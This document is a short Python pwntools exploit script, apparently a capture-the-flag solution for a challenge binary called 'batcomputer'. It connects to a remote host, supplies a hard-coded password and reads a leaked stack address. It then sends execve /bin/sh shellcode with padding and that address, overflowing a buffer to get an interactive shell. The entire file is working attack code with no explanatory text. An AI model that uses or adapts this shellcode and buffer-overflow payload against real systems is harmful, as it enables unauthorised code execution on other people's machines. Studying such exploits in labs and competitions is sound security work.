from pwn import *

context.log_level = 'critical'
context.binary = binary = ELF('./batcomputer')

address = '94.237.52.225'
port = 45021

password = b'b4tp@$$w0rd!'
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
overflow = b'A' * (84 - len(shellcode))

with remote(address, port) as target:
	target.recvuntil(b'> ')
	target.sendline(b'1')
	target.recvuntil(b'It was very hard, but Alfred managed to locate him: ')

	shellcode_addr = p64(int(target.recvline().strip().decode(), 16))

	target.recvuntil(b'> ')
	target.sendline(b'2')
	target.recvuntil(b'Ok. Let\'s do this. Enter the password: ')
	target.sendline(password)
	target.recvuntil(b'Enter the navigation commands: ')

	payload = shellcode
	payload += overflow
	payload += shellcode_addr

	target.sendline(payload)
	target.recvuntil(b'> ')
	target.sendline(b'3')
	target.interactive()
